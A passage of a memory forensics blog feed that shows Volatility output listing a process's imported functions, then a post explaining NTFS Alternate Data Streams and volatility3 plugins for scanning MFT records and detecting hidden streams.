plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                        strerror </span><span class="token operator">|</span><span class="token plain"> 0x80c114</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                            modf </span><span class="token operator">|</span><span class="token plain"> 0x80c118</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          strspn </span><span class="token operator">|</span><span class="token plain"> 0x80c11c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         realloc </span><span class="token operator">|</span><span class="token plain"> 0x80c120</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                    __p__environ </span><span class="token operator">|</span><span class="token plain"> 0x80c124</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                   __p__wenviron </span><span class="token operator">|</span><span class="token plain"> 0x80c128</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          _errno </span><span class="token operator">|</span><span class="token plain"> 0x80c12c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                            </span><span class="token function" style="color:rgb(80, 250, 123)">free</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> 0x80c130</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         strncmp </span><span class="token operator">|</span><span class="token plain"> 0x80c134</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          strstr </span><span class="token operator">|</span><span class="token plain"> 0x80c138</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         strncpy </span><span class="token operator">|</span><span class="token plain"> 0x80c13c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                           _ftol </span><span class="token operator">|</span><span class="token plain"> 0x80c140</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                           qsort </span><span class="token operator">|</span><span class="token plain"> 0x80c144</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                           fopen </span><span class="token operator">|</span><span class="token plain"> 0x80c148</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          perror </span><span class="token operator">|</span><span class="token plain"> 0x80c14c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TRUNCATED</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/voliat#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>The extraction of the IAT can be very useful for the analyst to identify the capabilities of a process in memory and gather context to better orient the reverse code analysis phase. When the analyst is willing to understand some of the Windows API functions, the Microsoft documentation is often explaining everything <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-5-efcee2" id="user-content-fnref-5-efcee2" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup>. Trying to look for some of the functions in the text section and extracting the value of the arguments can be the subject of a future blogpost. The pluging is available here and a pull request is in progress <a href="https://github.com/forensicxlab/volatility3/tree/feature/IAT" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3/tree/feature/IAT</a></p>
<blockquote>
<p>Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article or to comment on the integration to the volatility framework.</p>
</blockquote>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/voliat#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-efcee2">
<p><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-1-efcee2" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-efcee2">
<p><a href="https://0xrick.github.io/win-internals/pe2/#dos-header" target="_blank" rel="noopener noreferrer">https://0xrick.github.io/win-internals/pe2/#dos-header</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-2-efcee2" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-2-efcee2-2" data-footnote-backref="" aria-label="Back to reference 2-2" class="data-footnote-backref">‚Ü©<sup>2</sup></a></p>
</li>
<li id="user-content-fn-3-efcee2">
<p><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-3-efcee2" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-4-efcee2">
<p><a href="https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks" target="_blank" rel="noopener noreferrer">https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-4-efcee2" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-5-efcee2">
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/" target="_blank" rel="noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/api/</a> <a href="https://forensicxlab.github.io/blog/voliat#user-content-fnref-5-efcee2" data-footnote-backref="" aria-label="Back to reference 5" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Volatility</category>
            <category>Memory Forensics</category>
            <category>Windows</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 : Alternate Data Stream Scan]]></title>
            <link>https://forensicxlab.github.io/blog/volads</link>
            <guid>https://forensicxlab.github.io/blog/volads</guid>
            <pubDate>Sat, 18 Nov 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.]]></description>
            <content:encoded><![CDATA[<p>Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-master-file-table">The Master File Table<a href="https://forensicxlab.github.io/blog/volads#the-master-file-table" class="hash-link" aria-label="Direct link to The Master File Table" title="Direct link to The Master File Table">‚Äã</a></h2>
<p>Forensic analysts utilize the MFT extensively as it provides a wealth of information during investigations. Every file or directory in an NTFS volume holds an entry in the MFT. Each MFT entry, also known as a record. By examining the MFT, one can acquire valuable insights into a system's file activity, including deleted files or folders, timestamps, and access permissions. This information can be used to determine which files were created, accessed, modified, or deleted, and when these actions occurred for example.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-mft-records">The MFT records<a href="https://forensicxlab.github.io/blog/volads#the-mft-records" class="hash-link" aria-label="Direct link to The MFT records" title="Direct link to The MFT records">‚Äã</a></h3>
<p>MFT entries or records are typically 1,024 bytes in size and are divided into several fields. Here is a very nice representation by Jaked Atinkson of an MFT record.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/mftfilerecord-e4ce1712bb2c8229c41d79242b53edb4.png" title="MFT Record" width="1600" height="1219" class="img_ev3q"></p>
<ul>
<li>
<p><strong>Header:</strong> Holds information about the record itself, such as its address and links to other records.</p>
</li>
<li>
<p><strong>File Attributes:</strong> Reveal crucial details about the file or directory, including its name, timestamp, size, and permission. File attributes may either be resident, meaning they are stored directly within the MFT record, or non-resident, indicating that they are stored elsewhere on the disk with only a reference in the MFT entry.</p>
</li>
</ul>
<p>The <strong>$DATA</strong> attribute typically contains the actual contents of the file, the data can be <strong>resident</strong> or <strong>non-resident</strong>.</p>
<p>A resident $DATA attribute means that the data is stored directly within the MFT record. This is usually the case for small files, where the data can fit within the record. The data will be stored directly in the MFT entry along with the metadata. Whereas a non-resident $DATA attribute is present when the file is too large for the record and therefore will contain a pointer to the location on the disk where the data is actually stored.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="alternate-data-streams-ads">Alternate Data Streams (ADS)<a href="https://forensicxlab.github.io/blog/volads#alternate-data-streams-ads" class="hash-link" aria-label="Direct link to Alternate Data Streams (ADS)" title="Direct link to Alternate Data Streams (ADS)">‚Äã</a></h3>
<p>NTFS is providing a feature called <strong>alternate data stream</strong> (ADS). Used by Windows, it consists of another stream of data that can be attached to a file without changing its size or content.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="data:image/gif;base64,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" title="ADS" width="492" height="234" class="img_ev3q"></p>
<p>One example of usage of this feature by Microsoft is the <strong>Zone.Identifier</strong> ADS. It is employed by Internet Explorer and other Windows applications to identify where a file was downloaded from and from a potentially unsafe zone (like the internet). This artefact is known to be very useful for forensics investigators. But it was also seen in the wild that some threat actors are abusing the ADS to hide malicious payloads. The ADS can be detected by the fact that a given record is holding multiple $DATA attributes.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-a-volatility3-plugin">Creating a volatility3 plugin<a href="https://forensicxlab.github.io/blog/volads#creating-a-volatility3-plugin" class="hash-link" aria-label="Direct link to Creating a volatility3 plugin" title="Direct link to Creating a volatility3 plugin">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-mftscan-plugin">The MFTScan plugin<a href="https://forensicxlab.github.io/blog/volads#the-mftscan-plugin" class="hash-link" aria-label="Direct link to The MFTScan plugin" title="Direct link to The MFTScan plugin">‚Äã</a></h3>
<p>Even if the MFT entries are stored on disk, the latter also cached in memory, which motivated the creation of the ‚ÄúMFTScan‚Äù volatility3 plugin. This plugin is scanning for $STANDARD_INFORMATION and $FILE_NAME attributes providing a view of the files that were present in the volatile memory of the target system.</p>
<div class="language-zsh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-zsh codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª ./vol.py -r pretty  -f Triage-Memory.mem  windows.mftscan.MFTScan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Formatting...0.00               PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   |         Offset | Record Type | Record Number | Link Count |  MFT Type |         Permissions |       Attribute Type |                     Created | ...|  Filename</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*  | 0xf88004477450 |        FILE |        146309 |          2 | Directory |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">** | 0xf880044774b0 |        FILE |        146309 |          2 | Directory |                 0x0 |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| AM1080~1.175</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*  | 0xf88004477850 |        FILE |        146310 |          2 |      File |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">** | 0xf880044778b0 |        FILE |        146310 |          2 |      File |             Archive |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| cfgmgr32.dll</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">** | 0xf88004477928 |        FILE |        146310 |          2 |      File |             Archive |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| cfgmgr32.dll</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*  | 0xf88004477c50 |        FILE |        146311 |          2 | Directory |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">** | 0xf88004477cb0 |        FILE |        146311 |          2 | Directory |                 0x0 |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| AMEA70~1.175</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-ads-plugin">The ADS plugin<a href="https://forensicxlab.github.io/blog/volads#the-ads-plugin" class="hash-link" aria-label="Direct link to The ADS plugin" title="Direct link to The ADS plugin">‚Äã</a></h3>
<p>A new addition the capabilities of the MFT analysis in memory would be to scan for ADS inside the records looking for others $DATA attributes that are resident. This plugin was therefore created to detect ADS and extract the resident data to present it to the analyst. The output shows the file associated with the ADS found as well as a Hexdump and disassembled view. The latter could potentially help an analyst to identify a malicious code.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="proof-of-concept">Proof Of Concept<a href="https://forensicxlab.github.io/blog/volads#proof-of-concept" class="hash-link" aria-label="Direct link to Proof Of Concept" title="Direct link to Proof Of Concept">‚Äã</a></h4>
<p>The  example below is showing the output of the plugin. We can see that the ‚Äúputty-64bit-0.70-installer.msi‚Äù for example was downloaded from the internet (see ZoneID=3 in the hexdump column).</p>
